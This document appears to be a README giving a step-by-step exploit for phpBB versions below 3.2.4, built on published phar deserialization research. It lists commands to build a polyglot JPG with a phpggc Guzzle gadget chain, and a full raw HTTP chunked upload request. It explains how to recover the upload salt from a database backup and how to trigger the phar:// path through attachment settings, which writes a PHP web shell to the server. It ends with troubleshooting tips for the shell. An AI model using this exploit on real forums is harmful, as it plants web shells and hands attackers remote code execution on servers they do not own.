# Exploiting phpBB < 3.2.4 with a super administrator account
Technique taken from the following article. Article also contains technical details regarding the exploitation.  
I am NOT the author of the following article, I have only researched and provided the details to exploit this vulnerability.
https://blog.ripstech.com/2018/phpbb3-phar-deserialization-to-remote-code-execution/  

### Step 1  - Create the payload  
  
Download the following repo  
git clone https://github.com/s-n-t/phpggc.git  
cd phpggc  
git clone https://github.com/RealLinkers/NiceForum  
chmod +x pharggc  
./pharggc -j ./NiceForum/yourawesomepicture.jpg -o polyglotfiletoupload.jpg Guzzle/FW1 /var/www/html/shell.php ./NiceForum/shell.php  

./pharggc -j <yourphoto.jpg> -o <polyglot.jpg> Guzzle/FW1 <your remote directory where the file will be written to> <your local shell file>  
  
 
### Step 2 - Exploiting the forum  
  
1. Upload the attachment and split it into two chunks so it get's uploaded to files/plupload (the temporary storage for chunks). Put all of the payload in the first chunk 0/2 and send it via burp  
```POST /posting.php?mode=reply&f=2&sid=f0cf1836f4751c7d0a7db22b0896065d&t=2 HTTP/1.1
Host: <ip>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://<ip>/posting.php?mode=reply&f=2&t=2&sid=f0cf1836f4751c7d0a7db22b0896065d
x-phpbb-using-plupload: 1
x-requested-with: XMLHttpRequest
Content-Length: 131921
Content-Type: multipart/form-data; boundary=---------------------------807136852579486344452419761
Connection: close

-----------------------------807136852579486344452419761
Content-Disposition: form-data; name="name"
o_1d0m7o1d0c9vq5suit1gfp1dspa.jpg

-----------------------------807136852579486344452419761

Content-Disposition: form-data; name="chunk"
0

-----------------------------807136852579486344452419761
Content-Disposition: form-data; name="chunks"
2

-----------------------------807136852579486344452419761
Content-Disposition: form-data; name="add_file"
Add the file

-----------------------------807136852579486344452419761
Content-Disposition: form-data; name="real_filename"
horizon-dawn-real.jpg

-----------------------------807136852579486344452419761
Content-Disposition: form-data; name="fileupload"; filename="blob"
Content-Type: application/octet-stream

�����xt... <content>
-----------------------------807136852579486344452419761
```    
2. Beat the filename randomization by downloading the database backup, the parameter is in the row plupload_salt. ACP -> Maintenance -> Backup  
3. The filename consists of MD5 which is derived from the request's random filename. In this case MD5(o_1d0m7o1d0c9vq5suit1gfp1dspa.jpg)
The whole schema conists of <salt>_<md5>jpg.part  
4. After that navigate to General -> Attachment settings, put in the file path phar://./../files/plupload/<salt>_<md5>jpg.part  
5. In case of succesful exploitation a php file, which contains your shell should be generated on the directory you specified.
  
For a more graphical overview check out the blog post's POC video.  
  
Common errors:    
1. Incorrect file path on the server  
2. The www-data user has no permissions to write to web directory. It will throw an error from Guzzle that permission is denied.  
3. If you would like to customize your shell, it must be a onliner without any </n> line breaks and mustn't contain any <"> characters without proper escaping.  


